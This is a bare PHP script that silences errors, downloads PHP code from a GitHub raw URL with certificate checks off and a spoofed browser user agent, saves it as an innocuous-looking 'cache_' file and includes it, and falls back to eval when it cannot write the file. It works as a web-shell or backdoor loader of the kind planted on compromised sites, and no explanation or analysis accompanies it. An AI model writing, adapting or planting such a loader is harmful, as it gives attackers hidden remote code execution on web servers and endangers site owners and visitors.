<?php
error_reporting(0);
ini_set('display_errors', 0);

function geturlsinfo($url) {
    if (function_exists('curl_exec')) {
        $conn = curl_init($url);
        curl_setopt($conn, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($conn, CURLOPT_FOLLOWLOCATION, 1);
        curl_setopt($conn, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 6.1; rv:32.0) Gecko/20100101 Firefox/32.0");
        curl_setopt($conn, CURLOPT_SSL_VERIFYPEER, 0);
        curl_setopt($conn, CURLOPT_SSL_VERIFYHOST, 0);
        curl_setopt($conn, CURLOPT_TIMEOUT, 30);
        $url_get_contents_data = curl_exec($conn);
        curl_close($conn);
    } elseif (function_exists('file_get_contents')) {
        $url_get_contents_data = @file_get_contents($url);
    } elseif (function_exists('fopen') && function_exists('stream_get_contents')) {
        $handle = @fopen($url, "r");
        $url_get_contents_data = $handle ? stream_get_contents($handle) : false;
        if ($handle) fclose($handle);
    } else {
        $url_get_contents_data = false;
    }
    return $url_get_contents_data;
}

$dir = dirname(__FILE__);
$tmp_file = $dir . '/cache_' . md5('swacy') . '.php';

$content = geturlsinfo('https://raw.githubusercontent.com/Sw4CyEx/SwacySYSTEM/main/swacySYS.php');

if ($content !== false) {
    if (file_put_contents($tmp_file, $content, LOCK_EX)) {
        include($tmp_file);
    } else {
        $content = str_replace(['<?php', '?>'], '', $content);
        eval($content);
    }
} else {
    echo "Connection Error.";
}
?>
